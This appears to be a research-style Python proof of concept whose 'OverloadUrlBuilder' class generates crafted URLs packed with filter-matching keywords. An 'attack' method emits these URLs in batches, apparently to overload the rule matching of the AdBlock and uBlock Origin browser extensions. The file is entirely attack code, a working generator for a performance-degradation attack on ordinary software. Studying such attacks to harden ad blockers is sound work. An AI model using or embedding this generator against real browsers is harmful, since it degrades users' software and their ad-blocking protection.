import random
import json
from pathlib import Path

def load_filters_from_json(input_file):
    with open(input_file, "r", encoding="utf-8") as f:
        return json.load(f)

def select_shortest_filter(filter_map):
    result = {}
    for type_, filters in filter_map.items():
        if filters:  
            shortest = min(filters, key=len)
            result[type_] = shortest
    return result

def extract_keywords(map) :
    KeywordList = {
        type_: list(keywords)
        for type_, keywords in map.items()
    }
    return KeywordList

# Predefined general-string (GS) keyword per target. The keyword maps no longer
# carry scores, so instead of picking the top-scoring keyword we use the known
# best one for each ad blocker.
BEST_KEYWORD_BY_TARGET = {
    "adblock": "side",
    "ubo": "ads",
}

html_to_filter_type = {
    "script": "script",
    "img": "image",
    "link": "stylesheet",
    "iframe": "subdocument",
    "video": "media",
    "audio": "media"
}

methodList = list(html_to_filter_type.keys())


class OverloadUrlBuilder:

    target = ''
    
    domainFilters = {}
    domainKeywordList = {}
    bestFilters = {}
    bestKeyword = ''
    bestTag = ''
    blockfiltersList = {}
    shortestfilters = {}
    separatorKeyword = {}
    separatorKeywordList = []

    def __init__(self, target) :
        current_dir = Path(__file__).resolve().parent
        folder = current_dir / 'keywordlist'

        self.target = target

        self.bestTag = 'link'

        self.domainFilters = load_filters_from_json(folder / f"{self.target}_keywordmap.json")
        self.domainKeywordList = extract_keywords(self.domainFilters)
        self.bestKeyword = BEST_KEYWORD_BY_TARGET[self.target]

   
        self.blockfiltersList = load_filters_from_json(folder / "blockfilters.json")
        self.shortestfilters = select_shortest_filter(self.blockfiltersList)

        self.separatorKeyword = load_filters_from_json(folder / "separatorkeywords.json")
        self.separatorKeywordList = set(self.separatorKeyword.keys())

        # remove empty keywords from self.domainKeywordList
        for tag in self.domainKeywordList.keys() :
            if '' in self.domainKeywordList[tag] :
                self.domainKeywordList[tag].remove('')
    
    def ConstructUrlPath(self, maxLength: int, is_gs: bool):
        path = ''
        l_cur = 11 # random string 
        elem_type = self.bestTag if is_gs else random.choice(methodList)
        filter_type = html_to_filter_type[elem_type]

        filter = self.shortestfilters[filter_type] if is_gs else random.choice(self.blockfiltersList[filter_type])

        while l_cur < maxLength:
            if is_gs :
                keyword = self.bestKeyword  
            else :
                keyword = random.choice(self.domainKeywordList[filter_type])

                if keyword == '' or keyword in filter :
                    continue

                if keyword in self.separatorKeywordList and filter_type in self.separatorKeyword[keyword] :
                    keyword = keyword + "~"

            new_segment = "/" + keyword
            l_cur = len(path) + len(new_segment) + len(filter) + 11

            if l_cur > maxLength:
                break
            
            path += new_segment
        
        return path + filter, elem_type


    def make_url(self, domain: str, maxLength: int, is_gs: bool):
        path, elem_type = self.ConstructUrlPath(maxLength, is_gs)
        return (domain + path), elem_type
 

    def attack(self, domain: str, numRequest: int, maxUrlLength: int, is_gs: bool) :
        tag = []
        for _ in range(numRequest):
            [url, elem_type] = self.make_url(domain, maxUrlLength, is_gs)
            tag.append([url, elem_type])
        return tag


if __name__ == '__main__':

    URL_LEN = 100
    TAG_AMOUNT = 5

    att = OverloadUrlBuilder('adblock')

    gs_url = att.make_url('https://ntmudUH9ap.com', URL_LEN, is_gs=True)
    rs_url = att.make_url('https://ntmudUH9ap.com', URL_LEN, is_gs=False)
    
    print(f"AdBlock GS URL: {gs_url[0]}, Type: {gs_url[1]}")
    print(f"AdBlock RS URL: {rs_url[0]}, Type: {rs_url[1]}")
    print()

    att = OverloadUrlBuilder('ubo')

    gs_tags = att.attack('https://ntmudUH9ap.com', TAG_AMOUNT, URL_LEN, is_gs=True)
    rs_tags = att.attack('https://ntmudUH9ap.com', TAG_AMOUNT, URL_LEN, is_gs=False)

    print(f"uBO GS TAGS : {gs_tags}")
    print(f"uBO RS TAGS : {rs_tags}")

